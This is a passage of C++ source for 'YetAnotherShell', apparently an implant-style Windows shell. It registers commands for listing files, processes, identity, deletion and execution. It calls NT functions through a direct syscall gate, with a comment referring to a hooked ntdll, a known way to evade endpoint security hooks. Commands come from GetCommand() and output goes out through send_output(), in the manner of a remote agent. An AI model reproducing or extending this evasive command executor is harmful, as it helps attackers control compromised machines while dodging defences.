	g_CommandMap[L"ls"] = InternalCommand_LS;
	g_CommandMap[L"dir"] = InternalCommand_LS;
	g_CommandMap[L"cd"] = InternalCommand_CD;
	g_CommandMap[L"ps"] = InternalCommand_PS;
	g_CommandMap[L"whoami"] = InternalCommand_WHOAMI;
	g_CommandMap[L"mkdir"] = InternalCommand_MKDIR;
	g_CommandMap[L"rmdir"] = InternalCommand_RMDIR;
	g_CommandMap[L"rm"] = InternalCommand_RM;
	g_CommandMap[L"run"] = InternalCommand_EXEC;
	// to add: something to send and get raw data

    NTSTATUS result = GetLibs();
    if(!NT_SUCCESS(result))
    {
        LOG_W(L"GetLibs Failed \n");
        return 0;
    }

    result = ResolveFunctions();
    if(!NT_SUCCESS(result))
    {
        LOG_W(L"Could not resolve some functions\n");
        return 0;
    }

    return 1;
}


// --------------------------------------------------------------------------------------------


int main()
{

	size_t numSyscalls = 0;
    Sys_stb syscallEntries[MAX_SYSCALLS];

	// ls stuff
    syscallEntries[numSyscalls++] = {"NtOpenFile", 0, 0, nullptr, nullptr};
    syscallEntries[numSyscalls++] = {"NtQueryDirectoryFile", 0, 0, nullptr, nullptr};
    syscallEntries[numSyscalls++] = {"NtClose", 0, 0, nullptr, nullptr};
    syscallEntries[numSyscalls++] = {"ZwQueryVolumeInformationFile", 0, 0, nullptr, nullptr};
	

    InitSyscallGate(syscallEntries, numSyscalls);

    if(!InitializeMicroShell())
    {
        LOG_W(L"Could not initialize MicroShell\n");
        return 1;
    } /*std::wcout << L"\nNtdll -> " << sLibs_shell.hHookedNtdll << std::endl;*/

	while(true)
	{
		std::wstring currentPath = Custom_GetCurrentDirectoryW();

		if(!currentPath.empty()) std::wcout << L"[YetAnotherShell] " << currentPath << L"> ";
		else std::wcout << L"[YetAnotherShell]> ";


		std::wstring recieved_command = GetCommand();
		if(recieved_command.empty()) continue;
		
		
		if(recieved_command == L"exit" || recieved_command == L"quit") break;

		std::wstring output = ExecuteMicroShell(recieved_command);
		send_output(output);
	}

	return 0;
}


std::wstring static ExecuteMicroShell(std::wstring input_command)
{
	if(input_command.empty()) return L"";

	size_t spacePos = input_command.find(' ');
	std::wstring command = input_command.substr(0, spacePos);
	std::wstring args = L"";
	
	if(spacePos != std::wstring::npos) args = input_command.substr(spacePos + 1);

	// Strip trailing whitespace, newlines, and carriage returns
	command.erase(command.find_last_not_of(L" \n\r\t") + 1);
	if(!args.empty()) args.erase(args.find_last_not_of(L" \n\r\t") + 1);

	// Dispatch execution
	if(g_CommandMap.find(command) != g_CommandMap.end()) return g_CommandMap[command](args);
	else return L"YetAnotherShell Error: Unrecognized internal command '" + command + L"'.\n";
}